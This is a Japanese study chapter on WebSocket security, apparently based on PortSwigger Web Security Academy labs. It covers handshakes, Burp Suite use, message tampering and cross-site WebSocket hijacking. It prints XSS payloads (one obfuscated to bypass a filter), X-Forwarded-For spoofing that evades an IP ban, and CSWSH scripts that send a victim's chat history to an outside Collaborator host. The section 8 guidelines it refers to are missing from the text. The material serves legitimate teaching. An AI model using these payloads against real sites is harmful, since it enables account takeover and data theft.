# WebSocket の脆弱性ハンティング — メッセージ改変・ハンドシェイク改変・クロスサイト WebSocket ハイジャック

> **この節で分かること**
> - WebSocket が何であり、なぜ HTTP とは別のテストが必要なのかを説明できる。
> - Burp Suite で WebSocket 通信を傍受・改変・再送・ハンドシェイク操作する手順を自分でたどれる。
> - WebSocket メッセージの改ざんで XSS などの入力起因脆弱性を発見・悪用できる（許可された検証環境で）。
> - ハンドシェイク改変（`X-Forwarded-For` 偽装など）でしか見つからない脆弱性を説明できる。
> - クロスサイト WebSocket ハイジャック（CSWSH）の成立条件・影響・PoC・防御を説明できる。
> - WebSocket 接続を安全にするための 4 つの設計指針を挙げられる。

**元資料**: https://portswigger.net/web-security/websockets （原典は取得できず、複数の逐語ミラーで完全再構成したものをベースにしている）
**関連する節**: CSRF（クロスサイトリクエストフォージェリ）、XSS（クロスサイトスクリプティング）、OAST（帯域外アプリケーションセキュリティテスト）

---

## 1. なぜ WebSocket を別に学ぶ必要があるのか

### 1-1. WebSocket とは何か

WebSocket（ウェブソケット）とは、HTTP 上で開始され、双方向・全二重（bi-directional, full duplex）で長寿命の通信を行うプロトコルのこと。全二重とは、送信と受信を同時にできる通信方式のことで、電話のように双方が同時に話せる状態をイメージすればよい。

通常の HTTP は「クライアントがリクエストを送り、サーバがレスポンスを返す」という一往復のやり取り（トランザクション）で完結する。これに対して WebSocket 接続は一度確立すると開いたまま保たれ、メッセージはいつでもどちらの方向へも送れる。トランザクション的ではない、という点が最大の違いである。

WebSocket は低遅延（low-latency）やサーバ発（server-initiated）のメッセージが必要な場面で特に役立つ。原典が挙げる代表例は「金融データのリアルタイムフィード」である。ほかにもチャット、通知、ゲーム、ライブスコアなどに広く使われる。

### 1-2. HTTP と WebSocket の違い（設計意図）

HTTP でも接続を開いたままにする（keep-alive）ことはできるが、それは別々のリクエスト／レスポンスを効率よく処理するためのものであって、接続そのものが対話の場になるわけではない。WebSocket はその発想を変え、「開きっぱなしのパイプ」を用意して、どちらからでも好きなタイミングでメッセージを流し込めるようにした。

| 観点 | HTTP | WebSocket |
| --- | --- | --- |
| 通信の形 | リクエスト→レスポンスの一往復 | 双方向・全二重（いつでもどちらからでも） |
| 接続の寿命 | トランザクションごと（開いたままでも別トランザクションに再利用） | 長寿命。準備ができるまでアイドルで保持 |
| 開始方法 | 単独の HTTP リクエスト | HTTP 上のハンドシェイクで開始 |
| 主な用途 | 一般的なページ・API | 低遅延・サーバ発（リアルタイムフィード等） |

### 1-3. なぜセキュリティ上重要か（攻撃者はどこを見るか）

原典の核心的な一文はこうである。「通常の HTTP で生じる Web セキュリティ脆弱性は、事実上すべて WebSocket 通信でも生じ得る（Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications）」。

WebSocket は用途が広く、ユーザー操作の実行から機微情報の伝送まで担う。したがって SQL インジェクション、XML 外部エンティティ（XXE）インジェクション、XSS などが、そのまま WebSocket のメッセージ経路でも起こり得る。

さらに、ブラウザの開発者ツールや通常の HTTP プロキシだけでは WebSocket メッセージを扱いにくいため、テストには専用の手順が要る。ここを知らないと、脆弱性がそっくり見落とされる。だからこそ WebSocket は独立した学習トピックになっている。

---

## 2. WebSocket 接続はどう確立されるのか（ハンドシェイク）

### 2-1. クライアント側 JavaScript から接続を張る

WebSocket 接続は通常、クライアントサイドの JavaScript で次のように作る。

```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```

ここで `wss` と `ws` は別物である。原典の注記どおり、`wss` プロトコルは暗号化された TLS 接続上に WebSocket を確立し、`ws` プロトコルは暗号化されない接続を使う。TLS（Transport Layer Security）とは、通信を暗号化して盗聴・改ざんを防ぐ仕組みのこと。本番アプリでは必ず `wss://` を使うべきである（防御指針は第 7 節）。

### 2-2. ハンドシェイクの request と response（仕組み）

接続を確立するために、ブラウザとサーバは HTTP 上で「WebSocket ハンドシェイク」を行う。ハンドシェイクとは、通信を始める前に双方が取り決めを交わす握手のこと。ブラウザは次のようなハンドシェイクリクエストを送る（逐語）。

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

サーバが接続を受け入れると、次のようなハンドシェイクレスポンスを返す（逐語）。

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```

この `101 Switching Protocols` が返った時点で、ネットワーク接続は開いたままとなり、以後どちらの方向にも WebSocket メッセージを送れるようになる。

### 2-3. ハンドシェイクヘッダの意味

原典の注記が挙げるハンドシェイクの注目点を表にまとめる。

| ヘッダ | 役割 |
| --- | --- |
| `Connection` / `Upgrade` | request・response の双方にあり、これが WebSocket ハンドシェイクであることを示す |
| `Sec-WebSocket-Version` | クライアントが使いたい WebSocket プロトコルのバージョン。通常は `13` |
| `Sec-WebSocket-Key` | Base64 エンコードされたランダム値。ハンドシェイクごとにランダム生成されるべき |
| `Sec-WebSocket-Accept` | `Sec-WebSocket-Key` の値に、プロトコル仕様で定義された特定の文字列を連結したもののハッシュ |

`Sec-WebSocket-Accept` がわざわざ存在するのは、誤設定サーバやキャッシングプロキシによる誤解を招くレスポンスを防ぐためである。つまりこれは「本当に WebSocket を理解しているサーバが応答した」ことを確かめるための仕掛けであって、認証やセッション管理のためのものではない。この点は後の CSWSH で重要になる。

### 2-4. Sec-WebSocket-Key と Accept の関係（補足）

〔補足（一般知識）〕原典が「仕様で定義された特定の文字列」とだけ書いている部分の正体は、RFC 6455（WebSocket プロトコルの標準規格）が定める固定 GUID `258EAFA5-E914-47DA-95CA-C5AB0DC85B11` である。サーバは `Sec-WebSocket-Key` の値にこの GUID を連結し、SHA-1 でハッシュを取り、Base64 化して `Sec-WebSocket-Accept` を算出する。この GUID・SHA-1 の詳細は PortSwigger の当該ページには明記されていないため、補足として示す。

〔補足（一般知識）〕原典の例には現れないが、実際のハンドシェイクでは `Sec-WebSocket-Extensions`（例: `permessage-deflate` 圧縮の交渉）や `Sec-WebSocket-Protocol`（サブプロトコル交渉）が付くこともある。細部の正確な定義を確かめたい場合は、次の一次規格・リファレンスを各自参照するとよい。

> ### 📌 ここは自分で開いて読んでください
> **資料**: RFC 6455 “The WebSocket Protocol” — https://www.rfc-editor.org/rfc/rfc6455
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の egress 制限で一次規格へ到達できず）。以下の記述はノートの補足と検索知識にもとづく要約である。
> **読みどころ**:
> 1. `Sec-WebSocket-Accept` の算出（`Sec-WebSocket-Key` ＋固定 GUID を連結し SHA-1→Base64。§1.3, §4.2.2）。
> 2. フレーム構造とオペコード（§5.2）、クライアント→サーバのマスキング必須要件（§5.3。プロキシキャッシュ汚染対策）。
> 3. `Origin` の扱い（§4.1, §10.2）。ブラウザ以外のクライアントは `Origin` 検証を回避し得る＝CSWSH 防御で `Origin` 単独に頼れない根拠。
> **代替手段**: https://datatracker.ietf.org/doc/html/rfc6455 （同一規格の別ミラー）

> ### 📌 ここは自分で開いて読んでください
> **資料**: MDN WebSocket API — https://developer.mozilla.org/en-US/docs/Web/API/WebSocket
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の制限で到達できず）。以下はノートの参照案内にもとづく要約である。
> **読みどころ**:
> 1. `WebSocket` コンストラクタと `onopen`/`onmessage`/`onclose`/`onerror` イベント。後述の CSWSH PoC の `ws.onopen`/`ws.onmessage` の意味を実装レベルで理解できる。
> 2. `send()` と `readyState`。
> 3. PoC テンプレートの各行が何をしているかを確かめる。
> **代替手段**: なし

---

## 3. WebSocket メッセージの見た目

### 3-1. メッセージの送信

接続が確立された後は、クライアント・サーバのどちらからでも非同期にメッセージを送れる。ブラウザからのシンプルな送信例は次のとおり（逐語）。

```javascript
ws.send("Peter Wiener");
```

### 3-2. メッセージの中身は自由（多くは JSON）

原理上、WebSocket メッセージは任意の内容・データ形式を含み得る。現代のアプリでは構造化データを送るのに JSON（JavaScript Object Notation、キーと値でデータを表す軽量な形式）を使うのが一般的である。

たとえばチャットボットアプリのメッセージはこうなる（逐語）。

```json
{"user":"Hal Pline","content":"I wanted to be a Playstation growing up, not a device to answer your inane questions"}
```

この「どんな形式でも入る」性質が、後で見るインジェクション系の攻撃面になる。攻撃者はこの JSON の値を書き換えて、サーバや他ユーザーのブラウザに想定外の入力を届けようとする。

---

## 4. Burp Suite で WebSocket トラフィックを改変する

WebSocket の脆弱性発見は、一般に「アプリが想定しない方法で通信を改変する」ことで行う。中核ツールは Burp Suite（バープスイート、Web アプリのプロキシ・診断ツール）である。Burp でできることは大きく 3 つ、(1) メッセージの傍受と改変、(2) 再送と新規生成、(3) 接続（ハンドシェイク）の操作である。

### 4-1. メッセージの傍受と改変（Burp Proxy）

Burp Proxy を使って次の手順で傍受・改変する。傍受（interception）とは、通信を途中で止めて中身を見たり書き換えたりすること。

1. Burp のブラウザ（Burp's browser）を開く。
2. WebSocket を使うアプリ機能にアクセスする。Burp Proxy 内の「WebSockets history」タブにエントリが現れるかどうかで、WebSocket が使われているか判別できる。
3. Burp Proxy の Intercept タブで、傍受がオンになっていることを確認する。
4. ブラウザまたはサーバから WebSocket メッセージが送られると Intercept タブに表示され、閲覧・改変できる。Forward ボタンでメッセージを転送する。

原典の注記によれば、クライアント→サーバ方向とサーバ→クライアント方向のどちらのメッセージを傍受するかは Burp Proxy で設定できる。Settings ダイアログの **WebSocket interception rules** 設定で行う（設定項目の詳細は公式ドキュメント https://portswigger.net/burp/documentation/desktop/settings/tools/proxy#websocket-interception-rules を参照）。

### 4-2. 再送と新規メッセージ生成（Burp Repeater）

オンザフライ（その場での）傍受・改変に加えて、個々のメッセージを再送したり新しいメッセージを作ったりできる。使うのは Burp Repeater（リピーター、リクエストを手動で編集・再送するツール）である。

1. Burp Proxy の WebSockets history または Intercept タブでメッセージを選び、コンテキストメニューから「Send to Repeater」を選ぶ。
2. Burp Repeater で、選んだメッセージを編集し、何度でも送信できる。
3. 新しいメッセージを入力し、クライアント／サーバのどちらの方向にも送信できる。
4. Repeater 内の「History」パネルで、その WebSocket 接続で送受信されたメッセージ履歴を閲覧できる。Repeater で生成したものだけでなく、同一接続でブラウザやサーバが生成したものも含まれる。
5. History パネル内の任意のメッセージを編集・再送したいときは、メッセージを選んでコンテキストメニューから「Edit and resend」を選ぶ。

### 4-3. 接続（ハンドシェイク）の操作

メッセージ改変だけでなく、接続を確立する WebSocket ハンドシェイク自体を操作する必要が出る場合がある。原典が挙げる、ハンドシェイク改変が必要になる状況は 3 つ。

| # | 状況 |
| --- | --- |
| 1 | より多くの攻撃面（attack surface）に到達できる場合がある |
| 2 | ある種の攻撃で接続が切れ、新しい接続を張り直す必要がある |
| 3 | 元のハンドシェイク中のトークンやデータが古く（stale）、更新が必要 |

Burp Repeater でのハンドシェイク操作手順は次のとおり。

1. 前述の要領で WebSocket メッセージを Burp Repeater に送る。
2. WebSocket URL の隣にある鉛筆アイコン（pencil icon）をクリックする。ウィザードが開き、「既存の接続済み WebSocket にアタッチ」「接続済み WebSocket のクローン」「切断された WebSocket への再接続」を選べる。
3. クローンまたは再接続を選ぶと、ウィザードはハンドシェイクリクエストの全詳細を表示し、実行前に必要に応じて編集できる。
4. 「Connect」をクリックすると、Burp は設定したハンドシェイクを実行して結果を表示する。成功すれば、その接続を使って Repeater で新規メッセージを送れる。

```text
WebSocket テストのツール対応図
┌───────────────────────────────────────────────┐
│ Burp Proxy                                     │
│   ├ WebSockets history … WS利用の有無を確認     │
│   └ Intercept          … 傍受してその場で改変   │
│                                                │
│ Burp Repeater                                  │
│   ├ Send to Repeater   … メッセージを送り込む   │
│   ├ Edit and resend    … 履歴を編集・再送       │
│   └ 鉛筆アイコン        … ハンドシェイクを編集   │
│        (attach / clone / reconnect → Connect)  │
└───────────────────────────────────────────────┘
```

---

## 5. メッセージ改変による脆弱性の悪用

### 5-1. 基本方針（なぜメッセージを狙うか）

WebSocket に影響する入力起因の脆弱性の大半は、WebSocket メッセージの内容を改ざんする（tampering with the contents of WebSocket messages）ことで発見・悪用できる。理由は単純で、サーバや他ユーザーへ届く「入力」がまさにメッセージ本文だからである。

原理上、次のような脆弱性が生じ得る。

- サーバに送られるユーザー供給入力が安全でない方法で処理され、SQL インジェクションや XXE インジェクションにつながる。
- WebSocket 経由で到達するブラインド脆弱性の一部は、out-of-band（OAST）技法でしか検出できないことがある。ブラインド脆弱性（blind vulnerability）とは、攻撃の成否がレスポンス本文に直接現れない脆弱性のこと。たとえば注入は成功しているのに結果が画面やレスポンスに返らないケースで、成否を「見て」判断できない。だからこそ OAST（帯域外アプリケーションセキュリティテスト）とは、攻撃対象からの通信を攻撃者側の外部サーバで受け取り、その外部への通信の有無で脆弱性を確認する手法のことで、ブラインドな状況でも検出の手がかりを得られる。
- 攻撃者が制御するデータが WebSocket 経由で他の利用者へ伝送される場合、XSS その他のクライアントサイド脆弱性につながる。

### 5-2. XSS の PoC 例（どう動くか）

具体例で見る。チャットアプリが WebSocket でブラウザ⇄サーバ間のメッセージをやり取りするとき、ユーザーがチャットを打つと次のメッセージがサーバへ送られる。

```json
{"message":"Hello Carlos"}
```

その内容は WebSocket 経由で別のチャット利用者へ伝送され、利用者のブラウザで次のように描画される。

```html
<td>Hello Carlos</td>
```

ここで入力処理や防御が無ければ、攻撃者は次のメッセージを送ることで概念実証（PoC, Proof of Concept）の XSS を実行できる。

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

`<img src=1 onerror='alert(1)'>` は、読み込みに必ず失敗する画像を置き、失敗時に走る `onerror` で JavaScript（ここでは `alert(1)`）を実行させる古典的な XSS ペイロードである。これがそのまま `<td>` の中に描画されれば、受け取った他ユーザーのブラウザでスクリプトが動く。

### 5-3. ラボ①: クライアント側 HTML エンコードを回避して格納型 XSS

関連ラボは APPRENTICE 級「Manipulating WebSocket messages to exploit vulnerabilities」。オンラインショップの WebSocket 実装ライブチャットで、送信したメッセージをサポート担当者（support agent）がリアルタイムで閲覧する。課題は、WebSocket メッセージを使ってサポート担当者のブラウザで `alert()` を発火させること。

このラボの重要な実装詳細は、クライアントが `<` 文字を送信前に HTML エンコードする点である。HTML エンコードとは `<` を `&lt;` のような無害な表記に置き換える処理のこと。一見すると XSS を防いでいるように見える。

公式 Solution（逐語・7 手順）は次のとおり。

1. 「Live chat」をクリックしてチャットメッセージを送る。
2. Burp Proxy の WebSockets history タブで、チャットが WebSocket メッセージ経由で送られていることを確認する。
3. ブラウザから `<` 文字を含む新しいメッセージを送る。
4. Burp Proxy で対応する WebSocket メッセージを見つけ、`<` がクライアント側で送信前に HTML エンコードされていることを確認する。
5. Burp Proxy が WebSocket メッセージを傍受するよう設定した上で、もう 1 つチャットを送る。
6. 傍受したメッセージを次のペイロードに編集する: `<img src=1 onerror='alert(1)'>`
7. ブラウザで alert が発火することを確認する。これはサポート担当者のブラウザでも同様に起こる。

教訓は明快である。クライアント側のサニタイズ（`<` の HTML エンコード）は、Burp でメッセージを傍受・改変すれば容易にバイパスできる。攻撃者はブラウザの中の JavaScript を通さず、プロキシで直接ネットワークに流すメッセージを書き換えられるからだ。したがってクライアント側フィルタはセキュリティ境界にならない。サーバ／描画側で無害化しなければ、他ユーザー（サポート担当者）のブラウザで発火する格納型 XSS が成立する。

---

## 6. ハンドシェイク改変による脆弱性の悪用

### 6-1. なぜハンドシェイクを狙うのか

一部の WebSocket 脆弱性は、ハンドシェイクを操作することでしか発見・悪用できない。これらは設計上の欠陥（design flaws）を含む傾向があり、原典は 3 類型を挙げる。

| # | 欠陥のパターン |
| --- | --- |
| 1 | HTTP ヘッダへの誤った信頼でセキュリティ判断を行う（例: `X-Forwarded-For`） |
| 2 | セッション処理機構の欠陥。WebSocket メッセージが処理されるセッションコンテキストは、一般にハンドシェイクのセッションコンテキストで決まるため |
| 3 | アプリが使う独自 HTTP ヘッダが導入する攻撃面 |

`X-Forwarded-For` とは、プロキシを経由したリクエストで「本来のクライアント IP はこれだ」と伝えるための HTTP ヘッダのこと。攻撃者が自由に付けられるのに、アプリがこれを鵜呑みにして IP ベースの判断（BAN やアクセス制限）に使うと、簡単に欺かれる。

### 6-2. ラボ②: X-Forwarded-For で IP BAN を回避し、難読化 XSS でフィルタ突破

関連ラボは PRACTITIONER 級「Manipulating the WebSocket handshake to exploit vulnerabilities」。オンラインショップのライブチャットに、攻撃的だが欠陥のある XSS フィルタ（aggressive but flawed XSS filter）が備わっている。課題は、WebSocket メッセージでサポート担当者のブラウザに `alert()` を発火させること。

原典の Hint（逐語）は 2 点。XSS フィルタのバイパスに苦労する場合は XSS ラボを参照すること。そして、IP ベースの制限は `X-Forwarded-For` のような HTTP ヘッダでバイパスできることがある、というものである。

公式 Solution（逐語・9 手順）は次のとおり。

1. 「Live chat」をクリックしてチャットを送る。
2. Burp Proxy の WebSockets history タブでチャットが WebSocket 経由で送られているのを確認する。
3. メッセージを右クリック→「Send to Repeater」。
4. 基本的な XSS ペイロード `<img src=1 onerror='alert(1)'>` を含むメッセージを Edit and resend する。
5. 攻撃がブロックされ、WebSocket 接続が切断されることを確認する。
6. 「Reconnect」をクリックすると、IP アドレスが BAN されているため再接続に失敗することを確認する。
7. ハンドシェイクリクエストに次のヘッダを追加して IP アドレスを偽装する: `X-Forwarded-For: 1.1.1.1`
8. 「Connect」をクリックして WebSocket に再接続成功。
9. 難読化した XSS ペイロードを含む WebSocket メッセージを送る: `` <img src=1 oNeRrOr=alert`1`> ``

この難読化ペイロードのポイントは 2 つ。`oNeRrOr` のように大文字小文字を混在させることで、単純な文字列一致で `onerror` を弾くフィルタをすり抜ける。加えて `` alert`1` `` はバッククォート（タグ付きテンプレートリテラル）を使った関数呼び出しで、丸括弧 `()` を検知するフィルタを回避する。HTML の属性名やタグ名は大文字小文字を区別しないため、`oNeRrOr` はブラウザ上では正しく `onerror` として動く。

このラボの核心は 2 段構えである。まずハンドシェイク改変（`X-Forwarded-For` 偽装）で IP ベースの BAN／制限を回避し、アクセスを取り戻す。次にメッセージ側で難読化 XSS を送りフィルタを突破する。前者は「HTTP ヘッダへの誤った信頼」の具体例そのものである。

### 6-3. IP ベース制限をヘッダで欺く危険（つなぎ）

なお、`X-Forwarded-For` の値は攻撃者が任意に決められる。IP を信頼の根拠にするなら、信頼できるプロキシが付けた値だけを採用し、クライアント由来のヘッダは捨てる設計が必要である。ラボ②は「ヘッダを信じるとアクセス制御が崩れる」ことを、実際に手を動かして体感させる作りになっている。

---

## 7. クロスサイト WebSocket ハイジャック（CSWSH）

### 7-1. CSWSH とは何か（定義）

クロスサイト WebSocket ハイジャック（Cross-site WebSocket hijacking, CSWSH。別名 cross-origin WebSocket hijacking）とは、WebSocket ハンドシェイクに対する CSRF 脆弱性を悪用する攻撃のこと。CSRF（クロスサイトリクエストフォージェリ, Cross-Site Request Forgery）とは、ログイン中の被害者のブラウザに、攻撃者のページから意図しないリクエストを送らせる攻撃のこと。

CSWSH が成立するのは、ハンドシェイクリクエストがセッション管理を HTTP Cookie のみに依存し、CSRF トークンやその他の予測不能値を含まないときである。Cookie は同一サイト宛のリクエストに自動付与されるため、被害者がログイン中なら攻撃者のページから張った接続にも Cookie が付いてしまう。

攻撃者は自ドメインに悪意あるページを作り、脆弱なアプリへクロスサイトの WebSocket 接続を確立する。アプリはその接続を被害者利用者のセッションのコンテキストで処理してしまう。攻撃者ページはその接続経由でサーバに任意のメッセージを送信でき、しかもサーバから返るメッセージの内容を読み取ることもできる。

### 7-2. 通常の CSRF との違い（なぜ危険か）

ここが CSWSH の怖さである。通常の CSRF は「攻撃者が被害者に代わってリクエストを送る（送信のみ）」ものだが、CSWSH では乗っ取った WebSocket 越しに双方向（two-way）の対話が得られる。つまり送信だけでなく受信（機密データの窃取）まで可能になる。

| 観点 | 通常の CSRF | CSWSH |
| --- | --- | --- |
| 方向 | 送信のみ | 双方向（送信＋受信） |
| できること | 被害者になりすまして操作を発火 | 操作の発火＋機密データの窃取 |
| 攻撃の場 | 単発の HTTP リクエスト | 開いたままの WebSocket 接続 |

CSWSH 攻撃が成功すると、攻撃者はしばしば次の 2 つが可能になる。第一に、被害者になりすました不正操作の実行（Perform unauthorized actions masquerading as the victim user）。アプリがクライアント生成の WebSocket メッセージで機微な操作を行うなら、攻撃者は適切なメッセージをクロスドメインで生成してそれらを発火できる。第二に、利用者がアクセスできる機密データの窃取（Retrieve sensitive data that the user can access）。アプリがサーバ生成の WebSocket メッセージで機密データを返すなら、攻撃者はそれを傍受して被害者のデータを捕捉できる。

### 7-3. 攻撃の第一歩（どこを突くか）

CSWSH は本質的に「WebSocket ハンドシェイク上の CSRF 脆弱性」なので、攻撃の第一歩は、アプリが行うハンドシェイクを精査し、CSRF から保護されているかを判定することである。

通常の CSRF 成立条件に照らし、典型的にはセッション管理を HTTP Cookie のみに依存し、リクエストパラメータにトークン等の予測不能値を使っていないハンドシェイクを探す。次のハンドシェイクは、唯一のセッショントークンが Cookie で送られているため、おそらく CSRF に脆弱である（逐語）。

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```

ここで注意。`Sec-WebSocket-Key` ヘッダはキャッシングプロキシによるエラーを防ぐためのランダム値であって、認証やセッション管理の目的には使われない。ランダムに見えるからといって、これが CSRF 対策トークンの代わりになるわけではない。

ハンドシェイクが CSRF に脆弱なら、攻撃者ページはクロスサイトリクエストで脆弱サイト上の WebSocket を開ける。その後に何が起きるかはアプリのロジック次第で、攻撃は「なりすまし操作のためのメッセージ送信」「機密データ取得のためのメッセージ送信」、ときには「機密データを含む着信メッセージが届くのを待つだけ」を伴い得る。

### 7-4. CSWSH の PoC（どう動くか）

〔補足（一般知識・出典明記）〕原典の CSWSH 記事本文には完全な PoC JavaScript は含まれない（原理と手順のみ）。実際にラボを解く際に使う標準的な PoC は次の形である（出典: コミュニティのラボ解法ミラー sh3bu/Portswigger_labs。ラボ解法の代表例として、防御・診断目的で掲載）。

```html
<script>
    var ws = new WebSocket('wss://your-lab-id.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-id.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

このスクリプトを exploit サーバに置いて配信すると、被害者ブラウザが同一オリジンの Cookie を自動付与してハンドシェイクを行う。`ws.onopen`（接続が開いた瞬間に走る関数）で `READY` を送信し、その応答としてサーバがチャット履歴（機密データ）を返す。`ws.onmessage`（メッセージを受信するたびに走る関数）で、受け取った本文 `event.data` を `fetch` で Burp Collaborator（`oastify.com`）へ送出する。Burp Collaborator とは、攻撃対象からの帯域外通信を受け取るための PortSwigger の公開サーバのこと（機能の詳細は公式ドキュメント https://portswigger.net/burp/documentation/desktop/tools/collaborator を参照）。攻撃者は Collaborator の HTTP/DNS 相互作用ログから、たとえば別ユーザー（carlos）のパスワードを含むメッセージ本文を回収できる。

### 7-5. ラボ③: exploit サーバと Collaborator でチャット履歴を窃取

関連ラボは「Cross-site WebSocket hijacking」（パス: `/web-security/websockets/cross-site-websocket-hijacking/lab`）。課題は、exploit サーバに HTML/JavaScript ペイロードをホストし、CSWSH 攻撃で被害者のチャット履歴を窃取して、それを使って被害者のアカウントにアクセスすること。

原典の Note（逐語）は重要である。Academy プラットフォームが第三者攻撃に悪用されるのを防ぐため、ファイアウォールがラボと任意の外部システムとの通信をブロックしている。そのためラボを解くには、提供された exploit サーバおよび／または Burp Collaborator のデフォルト公開サーバを使う必要がある。

公式 Solution（逐語・12 手順の要点）は次のとおり。

1. 「Live chat」でチャットを送る。
2. ページをリロードする。
3. Burp Proxy の WebSockets history タブで、`READY` コマンドが過去のチャットメッセージをサーバから取得することを確認する。
4. HTTP history タブで WebSocket ハンドシェイクリクエストを見つけ、CSRF トークンが無いことを確認する。
5. ハンドシェイクリクエストを右クリック→「Copy URL」。
6. exploit サーバの「Body」に公式テンプレート（下記）を貼る。
7. `your-websocket-url` をハンドシェイク URL（`YOUR-LAB-ID.web-security-academy.net/chat`）に置換する。プロトコルを `https://` から `wss://` に変えること。`your-collaborator-url` を Burp Collaborator が生成したペイロードに置換する。
8. 「View exploit」をクリックして自分で動作確認する。
9. Collaborator タブで相互作用をポーリングし、チャット履歴が Collaborator 経由で窃取されたことを確認する。チャットの各メッセージごとに Collaborator が HTTP リクエストを受信し、ボディにチャット内容が JSON 形式で入る（順序は正しく届かないことがある）。
10. exploit サーバに戻り、exploit を被害者に配信する（Deliver to victim）。
11. 再び Collaborator をポーリングし、被害者のチャット履歴を含む HTTP 相互作用を受信する。メッセージを調べると、その 1 つに被害者のユーザー名とパスワードが含まれる。
12. 窃取した資格情報で被害者アカウントにログインする。

公式 exploit テンプレート（逐語。原典ラボ Solution 掲載のもの）は次のとおりで、プレースホルダが `your-websocket-url` / `your-collaborator-url` になっている点だけが 7-4 のコミュニティ版との違いで、構造は同一である。

```html
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

この CSWSH の攻撃形は、突き詰めると「`READY` を送る→サーバがチャット履歴を返す→`onmessage` で Collaborator へ exfiltrate（外部へ持ち出す）」の 1 点に集約される。教訓は 4 つ。(a) ハンドシェイクに CSRF トークンが無く Cookie のみでセッション管理していることが成立条件（HTTP history で確認）。(b) `"READY"` のようなサーバに機密データを吐かせるトリガーメッセージを知ることが鍵。(c) 通常 CSRF と違い受信（機密データ窃取）まで可能で、実害は資格情報流出→アカウント乗っ取りに至る。(d) 防御は Origin 検証＋ハンドシェイクへの CSRF トークン付与である。

### 7-6. Origin ヘッダと CSWSH 防御（補足）

〔補足（一般知識）〕CSWSH ラボで観測される「同一オリジンの正常なハンドシェイク」には `Origin` ヘッダが含まれる。sh3bu ミラーの実キャプチャ例（値はラボ固有）は次のとおり。

```http
GET /chat HTTP/1.1
Host: 0a5a...web-security-academy.net
Sec-WebSocket-Version: 13
Origin: https://0a5a...web-security-academy.net
Sec-WebSocket-Key: rHRYnTnQlSN0/MayNfD9gQ==
Connection: keep-alive, Upgrade
Cookie: session=tcnP10xowGofDir0BMeIf0fn8ll8JpEW
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: websocket
Sec-Fetch-Site: same-origin
Upgrade: websocket
```

`Origin` ヘッダとは、リクエストがどのサイト（オリジン）から発せられたかをブラウザが付ける値のこと。CSWSH が成立するのは、サーバがハンドシェイク時にこの `Origin` を検証していない（＝クロスオリジンからの接続を拒否しない）ためである。したがってサーバ側での `Origin` ヘッダ検証は CSWSH の主要な防御策の一つになる。

ただし `Origin` は、ブラウザを介さない攻撃者制御下のサーバ間リクエストでは偽装され得る。ここが初学者にわかりにくい点なので補っておく。`Origin` ヘッダを「本当のオリジン」に強制的に付けるのはブラウザだけである。被害者のブラウザが攻撃者ページから接続する CSWSH の経路では、`Origin` は攻撃者オリジンになるので検証で弾ける。しかし攻撃者が自分のサーバから（curl や自作クライアントで）直接ハンドシェイクを送る場合、`Origin` の値は攻撃者が自由に書けるため、正規オリジンになりすませてしまう。RFC 6455（§4.1／§10.2）も、ブラウザ以外のクライアントは `Origin` 検証を回避し得ると明記している。よって `Origin` 検証だけに頼らず、CSRF トークン等の予測不能値をハンドシェイクに含めることが推奨される。

CSWSH を含む WebSocket の防御・監査を体系的に確認したい場合は、攻撃者視点（PortSwigger）だけでなく、テスト観点を網羅したチェックリストにもあたっておくとよい。

> ### 📌 ここは自分で開いて読んでください
> **資料**: WebSockets ラボ 3 種（要ログイン・要 Burp Suite） — https://portswigger.net/web-security/websockets （トピックトップから各ラボへ）
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: ログイン必須のラボ環境で、サイト側の制限により到達できず）。上記の課題文・Solution は逐語ミラーで再構成した要約である。
> **読みどころ**:
> 1. ラボ①で Burp Proxy の WebSockets history と Intercept を使い、クライアント側 HTML エンコードを回避する感覚をつかむ。
> 2. ラボ②で Repeater の鉛筆アイコンからハンドシェイクを編集し、`X-Forwarded-For` を足して再接続する流れを体験する。
> 3. ラボ③で exploit サーバと Burp Collaborator を連携させ、CSWSH で資格情報を窃取→ログインまで通す。
> **代替手段**: OWASP Testing WebSockets（WSTG-CLNT-10 等）で、Origin 検証・認証認可・入力検証・TLS の体系的テスト観点を補える。

> ### 📌 ここは自分で開いて読んでください
> **資料**: OWASP Web Security Testing Guide — Testing WebSockets（WSTG-CLNT-10 等） — https://owasp.org/www-project-web-security-testing-guide/
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: サイト側の egress 制限で到達できず）。以下はノートの参照案内にもとづく要約である。PortSwigger が攻撃者視点で説明するのに対し、OWASP WSTG は「テスト・監査でどこを確認すべきか」を防御側のチェックリストとして体系化している点が補完になる。
> **読みどころ**:
> 1. **Origin 検証**: サーバがハンドシェイクの `Origin` を検証しているか（CSWSH の一次防御）。本節 7-6 の裏取りに使う。
> 2. **認証・認可**: WebSocket 接続とその後のメッセージが、正しくセッション・権限に紐づいて処理されているか（6 節のセッション処理欠陥に対応）。
> 3. **入力検証**: 双方向のメッセージ本文が untrusted として検証・エスケープされているか（5 節の XSS／SQLi に対応）。
> 4. **TLS**: `wss://` が使われ、機微データが暗号化されているか（8 節の指針 1 に対応）。
